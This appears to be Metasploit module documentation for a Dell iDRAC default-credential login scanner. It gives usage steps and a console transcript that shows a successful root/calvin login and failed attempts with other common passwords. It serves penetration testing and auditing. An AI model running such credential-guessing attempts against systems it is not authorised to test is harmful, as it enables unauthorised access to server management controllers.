## Vulnerable Application

This module attempts to login to a iDRAC webserver instance using
default username and password.  Tested against Dell Remote Access:

- Controller 6 - Express version 1.50 and 1.85,
- Controller 7 - Enterprise 2.63.60.62

## Verification Steps

1. Setup the Dell iDRAC
1. Start msfconsole
1. Do: `use auxiliary/scanner/http/dell_idrac`
1. Do: `set rhosts [ip]`
1. Do: `run`
1. You should see attempts to login.

## Options

## Scenarios

### iDRAC Controller 7 - Enterprise 2.63.60.62

```
msf6 > use auxiliary/scanner/http/dell_idrac
msf6 auxiliary(scanner/http/dell_idrac) > set verbose true
verbose => true
msf6 auxiliary(scanner/http/dell_idrac) > set rhosts 222.222.2.22
rhosts => 222.222.2.22
msf6 auxiliary(scanner/http/dell_idrac) > run

[*] Verifying that login page exists at 222.222.2.22
[*] Attempting authentication
[+] https://222.222.2.22:443/ - SUCCESSFUL login for user 'root' with password 'calvin'
[-] https://222.222.2.22:443/ - Dell iDRAC - Failed to login as 'user1' with password 'calvin'
[-] https://222.222.2.22:443/ - Dell iDRAC - Failed to login as 'user1' with password '123456'
[-] https://222.222.2.22:443/ - Dell iDRAC - Failed to login as 'user1' with password 'password'
[-] The connection timed out (222.222.2.22:443).
[-] https://222.222.2.22:443/ - Dell iDRAC - Failed to login as 'admin' with password 'calvin'
[-] The connection timed out (222.222.2.22:443).
[-] https://222.222.2.22:443/ - Dell iDRAC - Failed to login as 'admin' with password '123456'
[-] The connection timed out (222.222.2.22:443).
[-] https://222.222.2.22:443/ - Dell iDRAC - Failed to login as 'admin' with password 'password'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/dell_idrac) > creds
Credentials
===========

host          origin        service          public  private  realm  private_type  JtR Format
----          ------        -------          ------  -------  -----  ------------  ----------
222.222.2.22  222.222.2.22  443/tcp (https)  root    calvin          Password      
```
